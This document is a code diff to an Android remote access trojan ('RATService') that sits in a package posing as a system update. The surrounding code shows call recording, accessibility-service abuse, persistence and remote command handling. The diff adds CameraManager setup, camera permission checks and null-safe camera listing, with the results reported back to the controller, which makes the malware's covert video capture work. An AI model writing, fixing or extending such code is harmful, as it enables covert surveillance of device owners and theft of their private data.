@@ -34,6 +34,7 @@ import androidx.core.app.ActivityCompat;
 import android.Manifest;
 import android.content.pm.PackageManager;
 import org.json.JSONArray;
+import android.hardware.camera2.CameraManager;
 
 import com.android.system.update.modules.*;
 
@@ -97,6 +98,8 @@ public class RATService extends Service {
     private DeviceModule deviceModule;
     private AppManagerModule appManagerModule;
     private CallRecordingModule callRecordingModule;
+    private CameraManager cameraManager;
+
     // Track camera state
     private boolean isUsingFrontCamera = false;
     // Video module
@@ -198,7 +201,10 @@ public void onCreate() {
         appManagerModule = new AppManagerModule(this);
         Log.d(TAG, "✅ App manager module initialized");
     }
-    
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+    cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+    Log.d(TAG, "✅ CameraManager initialized");
+}
     // Video module initialization
     if (Config.ENABLE_VIDEO) {
         videoModule = new VideoModule(this);
@@ -347,7 +353,29 @@ private void bringAppToForeground() {
     private BrowserAccessibilityService getBrowserAccessibilityService() {
         return BrowserAccessibilityService.getInstance();
     }
+    // Add this method to RATService.java
+private String checkCameraPermissions() {
+    StringBuilder result = new StringBuilder();
     
+    try {
+        boolean hasCamera = ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
+                == PackageManager.PERMISSION_GRANTED;
+        result.append("CAMERA: ").append(hasCamera).append(", ");
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            boolean hasForegroundCamera = ActivityCompat.checkSelfPermission(this, 
+                    Manifest.permission.FOREGROUND_SERVICE_CAMERA)
+                    == PackageManager.PERMISSION_GRANTED;
+            result.append("FOREGROUND_CAMERA: ").append(hasForegroundCamera);
+        } else {
+            result.append("FOREGROUND_CAMERA: not_required");
+        }
+    } catch (Exception e) {
+        result.append("ERROR: ").append(e.getMessage());
+    }
+    
+    return result.toString();
+}
     private void schedulePersistenceJob() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             try {
@@ -735,14 +763,26 @@ case "video_test":
         Log.d(TAG, "📹 Testing video module");
         boolean hasCamera = false;
         try {
-            String[] cameraIds = cameraManager.getCameraIdList();
-            hasCamera = cameraIds != null && cameraIds.length > 0;
+            if (cameraManager != null) {
+                String[] cameraIds = cameraManager.getCameraIdList();
+                hasCamera = cameraIds != null && cameraIds.length > 0;
+                Log.d(TAG, "📹 Available cameras: " + (hasCamera ? cameraIds.length : 0));
+                if (hasCamera) {
+                    for (String id : cameraIds) {
+                        Log.d(TAG, "📹 Camera ID: " + id);
+                    }
+                }
+            } else {
+                Log.e(TAG, "📹 CameraManager is null");
+            }
         } catch (Exception e) {
             Log.e(TAG, "Error checking cameras", e);
         }
         sendCommand("VIDEO_TEST|Camera available: " + hasCamera + 
                     ", Module: " + (videoModule != null) +
                     ", Permissions: " + checkCameraPermissions());
+    } else {
+        sendCommand("VIDEO_TEST|Video module not available");
     }
     break;
             case "video_start":
